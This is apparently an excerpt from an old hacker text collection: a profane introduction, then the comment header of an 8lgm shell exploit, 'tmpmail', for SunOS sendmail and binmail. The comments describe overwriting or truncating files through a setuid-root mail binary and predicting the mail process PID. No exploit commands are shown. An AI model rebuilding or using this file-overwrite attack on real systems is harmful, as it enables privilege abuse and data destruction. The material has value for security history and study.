[ File #11:]


[ I was told this was *thee* absolute latest sendmail script. If I am wrong,
  spank me, cuz not only do I not give a flying fuck, but there are so many
  sendmail exploits, it makes my head spin and I do not even try to keep
  up with all of them. -hC ]

#!/bin/sh
# tmpmail: overwrite files using binmail
#
# Usage: tmpmail to-file
#
# [8lgm], tested under SunOS 4.1.2.
#
# Definitely NOT for distribution, please do not use for cracking purposes!
# This script is only to be provided to trusted users, due to poor
# workaround chances.
#
# Note: Script only works if mail is suid root.
#       Other vendors may use tmpnam("ma").
#
# This vulnerability can be exploited for sgid
# mail binmails, the only modification would
# be to predict the pid of the mail process
# created by sendmail.  This would be 4 forward
# of the current pid - assuming a 'quiet' system.
#
# Will create to-file, or truncate.
